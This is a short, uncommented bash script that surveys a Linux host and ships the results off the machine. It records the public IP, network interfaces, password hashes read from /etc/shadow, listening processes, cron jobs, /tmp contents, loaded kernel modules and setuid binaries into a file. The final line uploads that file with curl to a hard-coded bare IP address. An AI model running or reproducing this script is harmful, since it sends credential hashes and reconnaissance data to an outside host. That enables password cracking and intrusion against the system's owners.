#!/bin/bash
NAME="`pwd`/`uname -n`.txt"
IP="`curl -s https://api.my-ip.io/ip`"
echo $NAME
rm $NAME
echo "--[ START: $NAME | $IP]--" >> $NAME

CMD="uname -a"
eval $CMD >> $NAME
echo "----" >> $NAME

CMD="ifconfig -a"
eval $CMD >> $NAME
echo "----" >> $NAME

CMD="cat /etc/shadow | grep '\\$'"
eval $CMD >> $NAME
echo "Total: `eval $CMD | wc -l`" >> $NAME
echo "----" >> $NAME

CMD="netstat -anpt | grep -v SYN | grep -v ACK | grep -v WAIT | grep -v Internet | grep -v Proto | awk '{print \$7}' | cut -d '/' -f 2 | sort -u"
eval $CMD >> $NAME
echo "Total: `eval $CMD | wc -l`" >> $NAME
echo "----" >> $NAME

echo "/var/spool/cron/" >> $NAME
CMD="ls -la /var/spool/cron/"
eval $CMD >> $NAME
echo "----" >> $NAME

echo "/tmp" >> $NAME
CMD="ls -la /tmp"
eval $CMD >> $NAME
echo "----" >> $NAME

CMD="pstree -a"
eval $CMD >> $NAME
echo "----" >> $NAME

CMD="lsmod"
eval $CMD >> $NAME
echo "----" >> $NAME

CMD="find / -perm /4000"
eval $CMD >> $NAME
echo "Total: `eval $CMD | wc -l`" >> $NAME
echo "----" >> $NAME

CMD="curl -F 'my_file=@$NAME' http://18.166.106.254/upload.php"
eval $CMD
echo "EOF"
